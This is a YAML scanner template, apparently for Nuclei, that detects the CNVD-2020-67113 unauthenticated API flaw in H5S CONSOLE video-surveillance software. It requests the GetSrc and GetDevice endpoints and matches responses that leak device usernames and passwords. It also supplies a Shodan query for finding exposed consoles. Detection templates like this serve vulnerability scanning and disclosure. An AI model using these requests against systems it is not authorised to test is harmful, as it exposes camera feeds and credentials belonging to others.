id: CNVD-2020-67113

info:
  name: H5S CONSOLE 未授权访问漏洞（CNVD-2020-67113）
  author: ritikchaddha
  severity: medium
  description: |
    H5S CONSOLE 的部分 API 存在未授权访问问题，攻击者可直接读取视频源和设备信息。模板请求 `/api/v1/GetSrc` 与 `/api/v1/GetDevice`，通过 JSON 中的用户、密码和设备字段确认漏洞。
  impact: |
    - 攻击者可获取监控设备、视频源、账号密码等敏感信息，进而访问或控制视频监控资源。
    - 视频平台暴露可能泄露现场画面、网络拓扑和安防资产信息。
  remediation: |
    - 升级 H5S CONSOLE 至修复版本，确保所有设备和视频源 API 强制认证。
    - 禁止公网直接访问控制台 API，仅允许可信管理网段或 VPN 访问。
    - 轮换已暴露的设备与平台账号密码，并审计异常 API 调用。
  reference:
    - https://vul.wangan.com/a/CNVD-2020-67113
  classification:
    cvss-metrics: CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N
    cvss-score: 5.3
    cwe-id: CWE-425
  metadata:
    verified: true
    max-request: 2
    shodan-query: http.title:"H5S CONSOLE"
  tags: cnvd,cnvd2020,h5s,unauth,h5sconsole,vuln

http:
  - method: GET
    path:
      - "{{BaseURL}}/api/v1/GetSrc"
      - "{{BaseURL}}/api/v1/GetDevice"

    stop-at-first-match: true

    matchers-condition: and
    matchers:
      - type: word
        part: body
        words:
          - 'strUser'
          - 'strPasswd'
        condition: and

      - type: word
        part: body
        words:
          - 'H5_AUTO'
          - 'H5_DEV'
        condition: or

      - type: word
        part: header
        words:
          - "application/json"

      - type: status
        status:
          - 200
